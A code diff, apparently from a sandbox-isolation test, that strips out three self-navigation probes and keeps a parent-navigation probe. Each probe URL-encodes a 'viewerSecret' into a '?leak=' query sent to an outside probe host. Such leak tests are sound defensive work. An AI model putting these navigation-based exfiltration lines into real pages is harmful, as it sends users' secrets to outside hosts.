@@ -23,9 +23,6 @@
         image: "not-attempted",
         form: "not-attempted",
         popup: "not-attempted",
-        selfLocationNavigation: "not-attempted",
-        selfReplaceNavigation: "not-attempted",
-        selfTargetNavigation: "not-attempted",
         parentNavigation: "not-attempted"
       };
 
@@ -120,44 +117,11 @@
 
       Promise.all([viewerFetch, externalFetch, imageAttempt])
         .then(() => {
-          results.selfLocationNavigation = "attempted";
-          results.selfReplaceNavigation = "attempted";
-          results.selfTargetNavigation = "attempted";
           results.parentNavigation = "attempted";
           results.completed = true;
           render();
 
           setTimeout(() => {
-            try {
-              window.location.href =
-                `${probeBaseUrl}/self-location?leak=${encodeURIComponent(viewerSecret)}`;
-            } catch (error) {
-              results.selfLocationNavigation =
-                `blocked:${describeError(error)}`;
-              render();
-            }
-
-            try {
-              window.location.replace(
-                `${probeBaseUrl}/self-replace?leak=${encodeURIComponent(viewerSecret)}`
-              );
-            } catch (error) {
-              results.selfReplaceNavigation =
-                `blocked:${describeError(error)}`;
-              render();
-            }
-
-            try {
-              window.open(
-                `${probeBaseUrl}/self-target?leak=${encodeURIComponent(viewerSecret)}`,
-                "_self"
-              );
-            } catch (error) {
-              results.selfTargetNavigation =
-                `blocked:${describeError(error)}`;
-              render();
-            }
-
             try {
               window.parent.location.href =
                 `${probeBaseUrl}/parent-navigation?leak=${encodeURIComponent(viewerSecret)}`;
